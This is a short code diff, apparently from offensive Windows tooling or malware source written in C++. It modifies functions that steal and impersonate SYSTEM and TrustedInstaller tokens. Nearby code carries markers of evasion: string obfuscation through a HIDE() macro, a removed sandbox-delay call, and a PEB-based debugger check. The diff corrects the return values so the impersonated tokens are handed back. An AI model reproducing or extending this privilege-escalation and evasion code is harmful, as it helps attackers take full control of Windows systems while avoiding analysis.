@@ -345,7 +345,6 @@ HANDLE ProcessManager::GetSystemToken() {
 	if ( logonPID == 0 ) // bad process id
 		return FALSE;
 	
-	//SandboxCompromise::DelayOperation();
 	HANDLE winlogon = CreateProcessAccessToken(logonPID);
 	if ( winlogon == NULL )
 		return NULL;
@@ -356,13 +355,12 @@ HANDLE ProcessManager::GetSystemToken() {
 
 	SetThisContext(SecurityContext::System);
 	m_ElevatedToken = impersonate;
-	return winlogon;
+	return impersonate;
 }
 
 HANDLE ProcessManager::GetTrustedInstallerToken() {
 	if ( m_Context < SecurityContext::System )
 		this->GetSystemToken();
-
 
 	DWORD  pid   = StartWindowsService(std::string(HIDE("TrustedInstaller")));
 	HANDLE token = CreateProcessAccessToken(pid);
@@ -373,11 +371,11 @@ HANDLE ProcessManager::GetTrustedInstallerToken() {
 	if ( impersonate == NULL )
 		return NULL;
 
+	OutputDebugStringA("ti");
 	SetThisContext(SecurityContext::TrustedInstaller);
 	m_ElevatedToken = impersonate;
-	return token;
+	return impersonate;
 }
-
 
 BOOL ProcessManager::CheckNoDebugger() {
 	PPEB filePEB = ( PPEB ) GetPebAddress();
